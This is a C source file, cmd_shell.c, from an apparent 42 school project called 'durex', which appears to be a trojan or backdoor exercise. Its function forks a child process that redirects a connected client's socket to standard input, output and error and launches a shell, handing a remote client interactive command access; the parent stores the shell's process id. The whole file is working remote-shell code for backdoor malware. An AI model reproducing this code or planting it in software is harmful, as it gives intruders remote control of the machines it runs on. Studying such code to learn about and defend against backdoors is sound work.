/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   cmd_shell.c                                        :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: mdufaud <mdufaud@student.42.fr>            +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2018/05/18 16:41:09 by mdufaud           #+#    #+#             */
/*   Updated: 2018/05/20 21:13:18 by mdufaud          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "durex.h"
#include <sys/types.h>
#include <signal.h>

extern char **environ;

static void reverse_shell(t_durex *durex, int co)
{
	char		*array[3];

	array[0] = REMOTE_SHELL_PATH;
	array[1] = REMOTE_SHELL_ARG;
	array[2] = NULL;
	dup2(co, STDIN_FILENO);
	dup2(co, STDOUT_FILENO);
	dup2(co, STDERR_FILENO);
	if (execve(array[0], array, environ) == -1)
		log_info(durex, "Shell - Permission denied for remote shell\n");
	exit(1);
}

int			cmd_shell(t_durex *durex, int co)
{
    pid_t   pid;

	if ((pid = fork()) < 0)
	{
		log_info(durex, "Could not fork for remote shell\n");
		message_client(durex, co, "Error: could not open remote shell\n");
		return (1);
	}
	if (pid == 0)
		reverse_shell(durex, co);
    else
        durex->clients[co].shell_pid = pid;
    return (1);
}
